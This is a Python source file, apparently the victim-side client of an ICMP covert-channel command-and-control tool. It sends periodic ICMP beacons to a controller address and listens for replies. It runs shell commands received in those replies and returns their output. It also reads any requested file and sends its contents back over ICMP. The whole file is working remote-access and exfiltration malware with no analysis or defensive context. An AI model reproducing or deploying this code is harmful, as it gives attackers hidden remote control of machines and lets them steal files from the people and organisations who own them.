
from icmp_c2_modules import *



cond = 0

def read_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()
        

def send_beacon(addr,data):
    while cond == 0:
        pkt_no_data = IP(dst=addr)/ICMP(type="echo-request")
        pkt_send(pkt_no_data,data,0)
        print("send beacon")
        time.sleep(5)
    

def parse_packet(packet):
    
    if  Raw in packet:
        global cond
        cond = 1
        
        prefix_packet = check_prefix(packet)     
        data_recieved = extract_data(packet)
        pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
        
        # if prefix_packet == RUN:
        #     print("i am in run module!:")
        #     txt_recieved = bin_to_str(data_recieved)
        #     print("command is: " + txt_recieved)
        #     output = RunCommand(txt_recieved)
        #     #bin_output = str_to_binary(output) 
        #     bin_output = bytes(output.encode())
        #     pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
        #     pkt_send(pkt_no_data,bin_output,1)
        #     pkt_send(pkt_no_data,EF,0)
        # elif prefix_packet == FILE:
        #     print("i am in file module!:")
        #     txt_recieved = bin_to_str(data_recieved)
        #     print("file name is: " +txt_recieved )
        #     output = read_file(txt_recieved)   # read in binary mode
        #     pkt_send(pkt_no_data,BEGIN_FILE + data_recieved,0)
        #     pkt_send(pkt_no_data,output,1)
        #     pkt_send(pkt_no_data,EF,0)
        
        if prefix_packet == RUN or prefix_packet == FILE:
            txt_recieved = bin_to_str(data_recieved)
            if prefix_packet == RUN:
                output = RunCommand(txt_recieved)
                bin_output = bytes(output.encode())
                pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
                pkt_send(pkt_no_data,bin_output,1)
            else:
                output = read_file(txt_recieved)   # read in binary mode
                pkt_send(pkt_no_data,BEGIN_FILE + data_recieved,0)
                pkt_send(pkt_no_data,output,1)
            pkt_send(pkt_no_data,EF,0)
                
        cond = 0
        print("cond changed to " + str(cond))
        

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter=ICMP_RESPONSE + " and host " + SERVER_ADR,handler=parse_packet)
    
signal.signal(signal.SIGINT, signal_handler)
beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
beacon_thread.start()

client_listen()
